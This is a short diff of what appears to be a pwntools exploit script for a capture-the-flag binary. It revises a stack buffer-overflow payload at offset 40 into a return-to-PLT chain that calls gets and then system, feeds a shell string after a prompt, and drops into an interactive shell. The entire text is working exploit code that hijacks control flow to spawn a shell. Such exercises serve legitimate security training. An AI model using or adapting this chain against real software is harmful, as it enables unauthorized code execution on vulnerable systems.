@@ -23,11 +23,8 @@ io = start()
 
 offset = 40
 
-payload = flat([
-    b"/bin/sh\x00" + b"A" * (offset - len(b'/bin/sh\x00')),
-    0x40101a,
-    elf.plt.system 
-])
+payload = flat({offset : [elf.plt.gets, elf.plt.system]})
 
-io.sendline(payload)
+io.sendlineafter(b">> ",payload)
+io.sendline(b"/bin0sh")
 io.interactive()
